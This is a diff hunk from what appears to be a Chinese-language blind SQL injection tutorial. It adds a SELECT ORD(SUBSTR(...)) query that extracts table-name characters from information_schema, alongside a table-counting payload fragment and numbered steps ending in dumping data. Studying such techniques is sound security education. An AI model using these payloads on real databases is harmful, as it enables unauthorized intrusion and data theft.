@@ -76,6 +76,9 @@ and (select count(table_name) from information_schema.tables where table_schema 
 ```
 5. 获取表名长度
 6. 获取表名
+```
+SELECT ORD(SUBSTR((select(TABLE_NAME) from information_schema.tables where table_schema = DATABASE() limit 3,1),2,1))
+```
 7. 获取字段长度
 7. 获取字段名称
 8. 获取数据
